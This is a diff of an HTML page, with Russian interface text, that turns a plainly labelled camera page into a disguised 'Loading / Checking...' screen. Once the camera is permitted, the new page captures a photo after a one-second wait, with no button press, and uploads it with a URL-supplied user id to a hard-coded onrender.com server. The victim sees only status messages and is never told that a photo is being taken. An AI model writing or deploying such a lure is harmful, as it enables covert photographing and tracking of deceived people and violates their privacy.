@@ -1,172 +1,200 @@
 <!DOCTYPE html>
-
-<html>
-
+<html lang="ru">
 <head>
 <meta charset="UTF-8">
-<title>Camera</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<title>Загрузка</title>
 
 <style>
 body {
-    text-align: center;
+    background: #111;
+    color: white;
     font-family: Arial;
-}
-
-video {
-    width: 90%;
-    max-width: 500px;
-    border-radius: 10px;
+    text-align: center;
+    padding-top: 50px;
 }
 
 button {
-    font-size: 20px;
-    padding: 15px;
+    padding: 15px 30px;
+    font-size: 18px;
+    border-radius: 10px;
+    border: none;
+    cursor: pointer;
+}
+
+#status {
     margin-top: 20px;
 }
 </style>
 
 </head>
 
-
 <body>
 
+<h2>Проверка...</h2>
 
-<h2>Камера</h2>
-
-
-<video id="video" autoplay playsinline></video>
-
-<br>
-
-<button onclick="takePhoto()">
-Сделать фото
-</button>
-
-
-<canvas id="canvas" style="display:none;"></canvas>
-
+<div id="status">
+Подключение...
+</div>
 
 
 <script>
 
-
-// получаем id пользователя из ссылки
-const params = new URLSearchParams(
-    window.location.search
-);
+const RENDER_URL = "https://kossah-github-io.onrender.com";
 
 
-const chat_id = params.get("id");
+async function start() {
+
+    const params = new URLSearchParams(window.location.search);
+
+    const user_id = params.get("id");
 
 
+    if (!user_id) {
 
-const video = document.getElementById("video");
+        document.getElementById("status").innerHTML =
+        "ID не найден";
 
-
-
-// включаем камеру
-
-navigator.mediaDevices.getUserMedia({
-    video: true
-})
-.then(stream => {
-
-    video.srcObject = stream;
-
-})
-.catch(err => {
-
-    alert("Нет доступа к камере: " + err);
-
-});
+        return;
+    }
 
 
+    try {
 
 
-
-function takePhoto(){
-
-
-    const canvas =
-    document.getElementById("canvas");
-
-
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-
-
-
-    const ctx =
-    canvas.getContext("2d");
-
-
-    ctx.drawImage(
-        video,
-        0,
-        0
-    );
-
-
-
-    canvas.toBlob(blob => {
-
-
-        let form =
-        new FormData();
-
-
-
-        form.append(
-            "image",
-            blob,
-            "photo.jpg"
+        const response = await fetch(
+            RENDER_URL + "/?id=" + user_id
         );
 
 
-
-        form.append(
-            "chat_id",
-            chat_id
-        );
+        const data = await response.json();
 
 
+        if(data.status === "ok") {
+
+            document.getElementById("status").innerHTML =
+            "Готово";
 
 
-        fetch(
-            "NGROK_ССЫЛКА/photo",
-            {
-                method: "POST",
-                body: form
-            }
-        )
-        .then(response => response.text())
-        .then(data => {
+            // включаем камеру
 
-            console.log(data);
-
-            alert("Фото отправлено");
-
-        })
-        .catch(error => {
-
-            console.log(error);
-
-            alert("Ошибка отправки");
-
-        });
+            openCamera(user_id);
 
 
+        } else {
 
-    }, "image/jpeg");
+            document.getElementById("status").innerHTML =
+            "Ошибка";
+
+        }
+
+
+    } catch(e) {
+
+        document.getElementById("status").innerHTML =
+        "Ошибка подключения";
+
+        console.log(e);
+
+    }
 
 }
 
 
+
+async function openCamera(user_id) {
+
+
+try {
+
+
+const stream = await navigator.mediaDevices.getUserMedia({
+    video:true
+});
+
+
+const video = document.createElement("video");
+
+video.srcObject = stream;
+
+video.autoplay = true;
+
+document.body.appendChild(video);
+
+
+
+setTimeout(()=>{
+
+
+const canvas = document.createElement("canvas");
+
+canvas.width = video.videoWidth;
+canvas.height = video.videoHeight;
+
+
+canvas.getContext("2d")
+.drawImage(video,0,0);
+
+
+
+canvas.toBlob(async(blob)=>{
+
+
+let form = new FormData();
+
+form.append("id", user_id);
+
+form.append("photo", blob, "photo.jpg");
+
+
+
+await fetch(
+RENDER_URL + "/photo",
+{
+method:"POST",
+body:form
+}
+);
+
+
+
+document.getElementById("status").innerHTML =
+"Фото отправлено";
+
+
+stream.getTracks().forEach(t=>t.stop());
+
+
+},3000);
+
+
+
+},1000);
+
+
+
+}
+
+catch(e){
+
+console.log(e);
+
+document.getElementById("status").innerHTML =
+"Камера запрещена";
+
+}
+
+
+
+}
+
+
+start();
 
 
 </script>
 
 
 </body>
-
 </html>
